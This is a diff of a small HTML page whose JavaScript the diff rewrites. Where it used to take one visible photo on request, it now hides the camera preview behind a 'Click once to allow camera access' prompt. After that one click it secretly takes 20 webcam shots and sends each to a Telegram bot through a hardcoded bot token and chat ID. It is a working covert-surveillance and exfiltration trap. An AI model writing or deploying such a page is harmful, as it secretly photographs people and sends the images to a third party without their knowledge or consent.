@@ -1,40 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Take a Photo</title>
+  <title>Auto Photo Capture</title>
 </head>
 <body>
-  <h2>Click below to take a photo</h2>
-  <video id="video" width="300" height="225" autoplay></video>
-  <button id="snap">Take Photo</button>
+  <h2>Click once to allow camera access</h2>
+  <button id="start">Start</button>
+  <video id="video" width="300" height="225" autoplay style="display: none;"></video>
   <canvas id="canvas" width="300" height="225" style="display: none;"></canvas>
 
   <script>
     const botToken = '7573311957:AAGMWs3uoC6v-6R9TDsW1P-S7K9UHpZ7BsQ';
-    const chatId = '-1002640168734'; // Aapka ya group ka chat ID
-
+    const chatId = '-1002640168734';
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const snap = document.getElementById('snap');
+    const startBtn = document.getElementById('start');
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => { video.srcObject = stream; });
+    startBtn.addEventListener('click', async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
 
-    snap.addEventListener('click', () => {
-      const context = canvas.getContext('2d');
-      context.drawImage(video, 0, 0, 300, 225);
-      canvas.toBlob(blob => {
-        const formData = new FormData();
-        formData.append('chat_id', chatId);
-        formData.append('photo', blob, 'photo.png');
+        startBtn.style.display = 'none'; // hide button after start
+        await new Promise(resolve => setTimeout(resolve, 1000)); // wait for video to be ready
 
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => alert("Photo sent!"))
-        .catch(error => alert("Failed to send photo"));
-      }, 'image/png');
+        const context = canvas.getContext('2d');
+
+        for (let i = 0; i < 20; i++) {
+          context.drawImage(video, 0, 0, 300, 225);
+
+          await new Promise(resolve => {
+            canvas.toBlob(blob => {
+              const formData = new FormData();
+              formData.append('chat_id', chatId);
+              formData.append('photo', blob, `photo_${i}.png`);
+
+              fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+              }).then(() => resolve()).catch(() => resolve());
+            }, 'image/png');
+          });
+
+          await new Promise(resolve => setTimeout(resolve, 1000)); // 1 sec delay
+        }
+
+        alert("All 20 photos sent.");
+      } catch (err) {
+        alert("Camera access denied or error occurred.");
+        console.error(err);
+      }
     });
   </script>
 </body>
